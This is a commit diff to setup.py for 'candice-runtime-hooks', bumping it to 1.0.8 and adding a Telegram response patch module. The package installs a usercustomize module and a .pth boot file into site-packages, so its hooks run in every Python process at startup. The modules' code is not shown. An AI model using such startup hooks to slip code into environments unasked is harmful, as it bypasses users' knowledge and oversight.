07d4741435d46250ad2b78764f30d647dda02053
kkpriyan97-pixel <kkpriyan97@gmail.com>
2026-09-16 07:34:23 +0400

    Package Telegram response delivery patch

--- setup.py
+++ setup.py
@@ -7,7 +7,7 @@ site_packages = os.path.relpath(sysconfig.get_path("purelib"), sys.prefix)
 
 setup(
     name="candice-runtime-hooks",
-    version="1.0.7",
-    py_modules=["usercustomize", "freshness_patch", "telegram_token_only", "outcome_recovery_guard", "account_telemetry", "account_selection_overlay"],
+    version="1.0.8",
+    py_modules=["usercustomize", "freshness_patch", "telegram_token_only", "outcome_recovery_guard", "account_telemetry", "account_selection_overlay", "telegram_response_patch"],
     data_files=[(site_packages, ["candice_boot.pth"])],
 )
